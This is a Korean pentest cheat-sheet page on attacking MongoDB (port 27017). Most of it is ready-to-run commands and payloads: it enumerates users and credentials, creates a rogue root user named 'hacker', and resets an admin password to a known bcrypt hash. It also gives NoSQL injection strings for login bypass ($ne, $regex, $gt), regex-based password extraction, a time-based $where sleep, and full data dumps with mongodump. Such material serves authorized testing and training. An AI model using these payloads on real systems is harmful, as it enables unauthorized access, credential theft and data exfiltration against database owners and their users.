---
sidebar_position: 2
---

# MongoDB - 27017

MongoDB NoSQL 데이터베이스 연결 및 공격 기법 모음입니다.

## 연결 방법

### mongo 클라이언트

```bash
# 로컬 연결
mongo

# 원격 연결
mongo <RHOST>
mongo <RHOST>:<PORT>
mongo "mongodb://<RHOST>:27017"

# 인증 연결
mongo <RHOST>/<DATABASE> -u <USERNAME> -p <PASSWORD>
mongo "mongodb://<USERNAME>:<PASSWORD>@<RHOST>:27017/<DATABASE>"

# 연결 문자열
mongo "mongodb://localhost:27017"
```

### mongosh (새 버전)

```bash
mongosh
mongosh "mongodb://<RHOST>:27017"
mongosh --host <RHOST> --port 27017
mongosh -u <USERNAME> -p <PASSWORD> --authenticationDatabase admin
```

## 기본 명령어

### 데이터베이스 관리

```javascript
show dbs;                    // 데이터베이스 목록
show databases;              // 데이터베이스 목록
use <DATABASE>;              // 데이터베이스 선택/생성
db;                          // 현재 데이터베이스
db.stats();                  // 데이터베이스 통계
db.getName();                // 데이터베이스 이름
```

### 컬렉션 (테이블) 관리

```javascript
show collections;            // 컬렉션 목록
show tables;                 // 컬렉션 목록
db.getCollectionNames();     // 컬렉션 이름 배열
db.<COLLECTION>.stats();     // 컬렉션 통계
```

### 사용자 및 권한

```javascript
show users;                  // 사용자 목록
db.getUsers();               // 사용자 상세 정보
db.getUsers({showCredentials: true});  // 자격증명 포함

use admin;
db.system.users.find();      // 모든 사용자 조회
```

### 데이터 조회

```javascript
db.<COLLECTION>.find();                    // 모든 문서
db.<COLLECTION>.find().pretty();           // 포맷된 출력
db.<COLLECTION>.findOne();                 // 첫 번째 문서
db.<COLLECTION>.find({username: "admin"}); // 조건 검색
db.<COLLECTION>.find().limit(10);          // 개수 제한
db.<COLLECTION>.count();                   // 문서 개수
```

### 일반적인 컬렉션

```javascript
db.users.find();
db.users.find().pretty();
db.accounts.find();
db.accounts.find().pretty();
db.system.keys.find();
db.admin.find();
```

## 데이터 조작

### 문서 삽입

```javascript
db.<COLLECTION>.insert({username: "hacker", password: "pass123"});
db.<COLLECTION>.insertOne({username: "admin", role: "admin"});
db.<COLLECTION>.insertMany([{...}, {...}]);
```

### 문서 수정

```javascript
db.<COLLECTION>.update({username: "admin"}, {$set: {password: "newpass"}});
db.<COLLECTION>.updateOne({username: "admin"}, {$set: {role: "superadmin"}});
```

### 비밀번호 재설정 (해시)

bcrypt 해시 "12345":

```javascript
db.getCollection('users').update(
  {username: "admin"}, 
  { $set: {"services" : { "password" : {"bcrypt" : "$2a$10$n9CM8OgInDlwpvjLKLPML.eizXIzLlRtgCh3GRLafOdR9ldAUh/KG" } } } }
);
```

### 문서 삭제

```javascript
db.<COLLECTION>.remove({username: "user"});
db.<COLLECTION>.deleteOne({username: "user"});
db.<COLLECTION>.deleteMany({});  // 모든 문서 삭제
```

## 사용자 관리

### 사용자 생성

```javascript
use admin;
db.createUser({
  user: "hacker",
  pwd: "password",
  roles: [{role: "root", db: "admin"}]
});
```

### 사용자 권한 부여

```javascript
db.grantRolesToUser("hacker", [{role: "root", db: "admin"}]);
```

### 사용자 삭제

```javascript
db.dropUser("username");
```

## NoSQL Injection

### 인증 우회

#### URL 파라미터

```bash
username=admin&password[$ne]=dummy
username[$ne]=dummy&password[$ne]=dummy
username[$regex]=.*&password[$regex]=.*
username[$gt]=&password[$gt]=
```

#### JSON

```json
{"username": "admin", "password": {"$ne": null}}
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
```

#### POST 데이터

```bash
username[$ne]=admin&password[$ne]=pass
```

### 연산자 악용

MongoDB 연산자:

```javascript
$eq  - 같음
$ne  - 같지 않음
$gt  - 크다
$gte - 크거나 같다
$lt  - 작다
$lte - 작거나 같다
$in  - 배열 내 존재
$nin - 배열 내 존재하지 않음
$regex - 정규식 매칭
$where - JavaScript 표현식
```

### 예제 페이로드

```javascript
// 항상 참
admin' || '1'=='1
admin' || ''=='
{"$where": "1==1"}

// 정규식으로 비밀번호 추출
{"username": "admin", "password": {"$regex": "^a"}}
{"username": "admin", "password": {"$regex": "^ad"}}
{"username": "admin", "password": {"$regex": "^adm"}}
```

### JavaScript Injection

```javascript
{"username": {"$where": "this.username == 'admin'"}}
{"$where": "sleep(5000)"}  // Time-based
```

## 명령 실행 (매우 제한적)

MongoDB는 직접적인 OS 명령 실행을 지원하지 않지만, 설정 파일이나 JavaScript를 통한 우회가 가능할 수 있습니다.

### JavaScript 함수 실행

```javascript
db.eval("function() { return 'test'; }");  // MongoDB 3.0 이후 제거됨
```

## 정보 수집

### 서버 정보

```javascript
db.version();
db.serverStatus();
db.serverBuildInfo();
db.hostInfo();
```

### 설정 확인

```javascript
db.adminCommand({getCmdLineOpts: 1});
db.adminCommand({getParameter: '*'});
```

### 데이터베이스 인덱스

```javascript
db.<COLLECTION>.getIndexes();
```

## 데이터 추출

### 전체 데이터 덤프

```javascript
db.<COLLECTION>.find().forEach(printjson);
```

### 특정 필드만 추출

```javascript
db.users.find({}, {username: 1, password: 1, _id: 0});
```

## 백업 및 복구

### mongodump

```bash
mongodump
mongodump --host <RHOST> --port 27017
mongodump --db <DATABASE>
mongodump --collection <COLLECTION>
```

### mongorestore

```bash
mongorestore dump/
mongorestore --host <RHOST> --port 27017 dump/
```

## 보안 점검

### 인증 없는 접근 확인

```bash
mongo <RHOST>:27017
# 접속되면 인증 없이 접근 가능
```

### 민감한 정보 검색

```javascript
db.users.find({}, {password: 1});
db.getCollection('sessions').find();
db.config.find();
```

## 참고

- MongoDB는 기본적으로 27017 포트 사용
- 기본 설정에서 인증 비활성화되어 있을 수 있음
- NoSQL Injection은 JSON 파라미터에서 발생
- `$ne`, `$regex` 등의 연산자 남용 주의
- `db.eval()`은 MongoDB 3.0+에서 제거됨
- 인증 우회 시 `[$ne]` 연산자가 효과적
- JavaScript 함수 실행은 보안상 제한됨
